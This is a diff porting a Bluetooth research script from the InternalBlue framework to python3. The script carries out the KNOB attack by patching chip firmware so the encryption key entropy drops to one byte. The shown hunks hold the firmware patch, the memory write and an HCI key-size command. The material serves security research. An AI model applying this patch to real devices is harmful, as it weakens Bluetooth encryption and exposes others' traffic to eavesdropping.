@@ -1,15 +1,13 @@
-#!/usr/bin/python2
+#!/usr/bin/python3
 
 # Jiska Classen, Secure Mobile Networking Lab
-
-
-from pwn import *
+from internalblue import Address
 from internalblue.adbcore import ADBCore
 import internalblue.cli as cli
 import internalblue.cmds as cmd
 import internalblue.hci as hci
 from internalblue.cmds import auto_int
-
+from internalblue.utils.pwnlib_wrapper import log, asm, u8, p16, u16
 
 
 """
@@ -36,10 +34,10 @@ log.info("Installing patch which ensures that send_LMP_encryptoin_key_size_req i
 
 # modify function lm_SendLmpEncryptKeySizeReq
 patch = asm("mov r2, #0x1", vma=0x5AED0)  # connection struct key entropy
-internalblue.patchRom(0x5AED0, patch)
+internalblue.patchRom(Address(0x5AED0), patch)
 
 # modify global variable for own setting
-internalblue.writeMem(0x203797, '\x01')  # global key entropy
+internalblue.writeMem(0x203797, b'\x01')  # global key entropy
 
 
 log.info("-----------------------KNOB-----------------------\n"
@@ -67,7 +65,7 @@ class CmdKnob(cmd.Cmd):
 
     def work(self):
         args = self.getArgs()
-        internalblue.sendHciCommand(0x1408, p16(args.hnd))
+        internalblue.sendHciCommand(hci.HCI_COMND.Encryption_Key_Size, p16(args.hnd))
         return True
 
 
